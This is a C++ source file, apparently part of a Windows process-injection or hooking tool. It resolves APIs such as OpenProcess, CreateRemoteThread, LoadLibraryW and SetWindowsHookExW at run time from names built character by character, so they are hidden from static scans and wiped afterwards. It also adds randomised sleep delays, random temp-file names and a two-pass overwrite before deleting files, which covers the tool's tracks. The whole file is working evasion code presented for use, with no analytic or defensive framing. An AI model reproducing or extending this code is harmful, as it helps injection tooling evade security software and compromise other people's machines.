#include "stealth.hpp"
#include "../crypto/crypto.hpp"
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

// ============================================================
// Dynamic API Resolution
// ============================================================

namespace StealthAPI {

    // Define all function pointers as nullptr initially
    pfnSetWindowsHookExW        pSetWindowsHookExW = nullptr;
    pfnUnhookWindowsHookEx      pUnhookWindowsHookEx = nullptr;
    pfnPostMessageW             pPostMessageW = nullptr;
    pfnPostThreadMessageW       pPostThreadMessageW = nullptr;
    pfnSendMessageTimeoutW      pSendMessageTimeoutW = nullptr;
    pfnEnumWindows              pEnumWindows = nullptr;
    pfnGetClassNameW            pGetClassNameW = nullptr;
    pfnGetWindowThreadProcessId pGetWindowThreadProcessId = nullptr;
    pfnIsWindow                 pIsWindow = nullptr;
    pfnLoadLibraryExW           pLoadLibraryExW = nullptr;
    pfnGetProcAddress           pGetProcAddress = nullptr;
    pfnFreeLibrary              pFreeLibrary = nullptr;
    pfnOpenProcess              pOpenProcess = nullptr;
    pfnCreateRemoteThread       pCreateRemoteThread = nullptr;
    pfnTerminateProcess         pTerminateProcess = nullptr;
    pfnLoadLibraryW             pLoadLibraryW = nullptr;

    // Helper: resolve a single function from a module
    static FARPROC ResolveFunction(HMODULE hModule, const std::string& funcName) {
        if (!hModule) return nullptr;
        FARPROC proc = ::GetProcAddress(hModule, funcName.c_str());
        // Wipe the function name from stack
        return proc;
    }

    bool Initialize() {
        // Load modules using char-by-char constructed names
        std::wstring k32Name = ObfStrings::Kernel32();
        std::wstring u32Name = ObfStrings::User32();

        HMODULE hKernel32 = GetModuleHandleW(k32Name.c_str());
        HMODULE hUser32 = LoadLibraryW(u32Name.c_str());

        SecureWipeString(k32Name);
        SecureWipeString(u32Name);

        if (!hKernel32 || !hUser32) {
            std::cout << "[!] Module resolution failed" << std::endl;
            return false;
        }

        // Resolve kernel32 functions
        {
            std::string name;

            name = ObfStrings::LoadLibraryExWA();
            pLoadLibraryExW = (pfnLoadLibraryExW)ResolveFunction(hKernel32, name);
            SecureWipeString(name);

            name = ObfStrings::GetProcAddressA();
            pGetProcAddress = (pfnGetProcAddress)ResolveFunction(hKernel32, name);
            SecureWipeString(name);

            // FreeLibrary
            name = ObfStrings::FreeLibraryA();
            pFreeLibrary = (pfnFreeLibrary)ResolveFunction(hKernel32, name);
            SecureWipeString(name);

            // OpenProcess — build char by char
            {
                char s[] = { 'O','p','e','n','P','r','o','c','e','s','s', 0 };
                pOpenProcess = (pfnOpenProcess)ResolveFunction(hKernel32, s);
                SecureZeroMemory(s, sizeof(s));
            }

            // CreateRemoteThread
            {
                char s[] = { 'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d', 0 };
                pCreateRemoteThread = (pfnCreateRemoteThread)ResolveFunction(hKernel32, s);
                SecureZeroMemory(s, sizeof(s));
            }

            // TerminateProcess
            {
                char s[] = { 'T','e','r','m','i','n','a','t','e','P','r','o','c','e','s','s', 0 };
                pTerminateProcess = (pfnTerminateProcess)ResolveFunction(hKernel32, s);
                SecureZeroMemory(s, sizeof(s));
            }

            // LoadLibraryW
            {
                char s[] = { 'L','o','a','d','L','i','b','r','a','r','y','W', 0 };
                pLoadLibraryW = (pfnLoadLibraryW)ResolveFunction(hKernel32, s);
                SecureZeroMemory(s, sizeof(s));
            }
        }

        // Resolve user32 functions
        {
            std::string name;

            name = ObfStrings::SetWindowsHookExWA();
            pSetWindowsHookExW = (pfnSetWindowsHookExW)ResolveFunction(hUser32, name);
            SecureWipeString(name);

            name = ObfStrings::UnhookWindowsHookExA();
            pUnhookWindowsHookEx = (pfnUnhookWindowsHookEx)ResolveFunction(hUser32, name);
            SecureWipeString(name);

            name = ObfStrings::PostMessageWA();
            pPostMessageW = (pfnPostMessageW)ResolveFunction(hUser32, name);
            SecureWipeString(name);

            name = ObfStrings::PostThreadMessageWA();
            pPostThreadMessageW = (pfnPostThreadMessageW)ResolveFunction(hUser32, name);
            SecureWipeString(name);

            name = ObfStrings::SendMessageTimeoutWA();
            pSendMessageTimeoutW = (pfnSendMessageTimeoutW)ResolveFunction(hUser32, name);
            SecureWipeString(name);

            name = ObfStrings::EnumWindowsA();
            pEnumWindows = (pfnEnumWindows)ResolveFunction(hUser32, name);
            SecureWipeString(name);

            name = ObfStrings::GetClassNameWA();
            pGetClassNameW = (pfnGetClassNameW)ResolveFunction(hUser32, name);
            SecureWipeString(name);

            name = ObfStrings::GetWindowThreadProcessIdA();
            pGetWindowThreadProcessId = (pfnGetWindowThreadProcessId)ResolveFunction(hUser32, name);
            SecureWipeString(name);

            // IsWindow
            {
                char s[] = { 'I','s','W','i','n','d','o','w', 0 };
                pIsWindow = (pfnIsWindow)ResolveFunction(hUser32, s);
                SecureZeroMemory(s, sizeof(s));
            }
        }

        // Verify all critical functions resolved
        bool allResolved = pSetWindowsHookExW && pUnhookWindowsHookEx && pPostMessageW
            && pPostThreadMessageW && pEnumWindows && pGetClassNameW
            && pGetWindowThreadProcessId && pIsWindow && pLoadLibraryExW
            && pGetProcAddress && pFreeLibrary && pOpenProcess
            && pCreateRemoteThread && pTerminateProcess && pSendMessageTimeoutW
            && pLoadLibraryW;

        if (!allResolved) {
            std::cout << "[!] Some API entries could not be resolved" << std::endl;
        }

        return allResolved;
    }
}

// ============================================================
// Masked Window Enumeration
// ============================================================

struct EnumWindowData {
    std::wstring targetClass;
    HWND foundHwnd;
};

static BOOL CALLBACK StealthEnumProc(HWND hwnd, LPARAM lParam) {
    EnumWindowData* data = reinterpret_cast<EnumWindowData*>(lParam);
    
    wchar_t className[256] = { 0 };
    
    // Use dynamically resolved GetClassNameW
    if (StealthAPI::pGetClassNameW) {
        StealthAPI::pGetClassNameW(hwnd, className, 256);
    } else {
        GetClassNameW(hwnd, className, 256);
    }
    
    if (_wcsicmp(className, data->targetClass.c_str()) == 0) {
        data->foundHwnd = hwnd;
        SecureZeroMemory(className, sizeof(className));
        return FALSE; // Stop enumeration
    }
    
    SecureZeroMemory(className, sizeof(className));
    return TRUE; // Continue
}

HWND StealthFindWindow(const std::wstring& className) {
    EnumWindowData data;
    data.targetClass = className;
    data.foundHwnd = NULL;
    
    // Use dynamically resolved EnumWindows
    if (StealthAPI::pEnumWindows) {
        StealthAPI::pEnumWindows(StealthEnumProc, reinterpret_cast<LPARAM>(&data));
    } else {
        EnumWindows(StealthEnumProc, reinterpret_cast<LPARAM>(&data));
    }
    
    // Wipe the class name from our struct
    SecureWipeString(data.targetClass);
    
    return data.foundHwnd;
}

// ============================================================
// Random Temp Filename
// ============================================================

std::wstring GenerateRandomTempPath(const std::wstring& extension) {
    wchar_t tempDir[MAX_PATH] = { 0 };
    GetTempPathW(MAX_PATH, tempDir);
    
    // Generate 8 random hex characters
    BYTE randomBytes[4];
    NTSTATUS status = BCryptGenRandom(NULL, randomBytes, 4, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    
    if (status != 0) {
        // Fallback
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<int> dist(0, 255);
        for (int i = 0; i < 4; i++) {
            randomBytes[i] = static_cast<BYTE>(dist(gen));
        }
    }
    
    std::wostringstream oss;
    oss << tempDir << L"tmp";
    for (int i = 0; i < 4; i++) {
        oss << std::hex << std::uppercase << std::setw(2) << std::setfill(L'0') << static_cast<int>(randomBytes[i]);
    }
    oss << extension;
    
    SecureZeroMemory(randomBytes, sizeof(randomBytes));
    SecureZeroMemory(tempDir, sizeof(tempDir));
    
    return oss.str();
}

// ============================================================
// Jittered Delay
// ============================================================

void JitteredSleep(DWORD minMs, DWORD maxMs) {
    if (minMs >= maxMs) {
        Sleep(minMs);
        return;
    }
    
    std::random_device rd;
    std::mt19937 gen(rd() ^ static_cast<unsigned>(GetTickCount64()));
    std::uniform_int_distribution<DWORD> dist(minMs, maxMs);
    
    Sleep(dist(gen));
}

// ============================================================
// Secure File Deletion
// ============================================================

bool SecureDeleteFile(const std::wstring& filePath) {
    // Open file for overwrite
    HANDLE hFile = CreateFileW(
        filePath.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hFile != INVALID_HANDLE_VALUE) {
        // Get file size
        LARGE_INTEGER fileSize;
        GetFileSizeEx(hFile, &fileSize);
        
        if (fileSize.QuadPart > 0 && fileSize.QuadPart < (1LL << 30)) { // Sanity: < 1GB
            // Overwrite with random data
            size_t sz = static_cast<size_t>(fileSize.QuadPart);
            std::vector<BYTE> junk(sz);
            BCryptGenRandom(NULL, junk.data(), static_cast<ULONG>(sz), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
            
            DWORD written;
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
            WriteFile(hFile, junk.data(), static_cast<DWORD>(sz), &written, NULL);
            FlushFileBuffers(hFile);
            
            // Second pass: zeros
            SecureZeroMemory(junk.data(), sz);
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
            WriteFile(hFile, junk.data(), static_cast<DWORD>(sz), &written, NULL);
            FlushFileBuffers(hFile);
            
            SecureWipe(junk);
        }
        
        CloseHandle(hFile);
    }
    
    // Delete the file
    return DeleteFileW(filePath.c_str()) != 0;
}
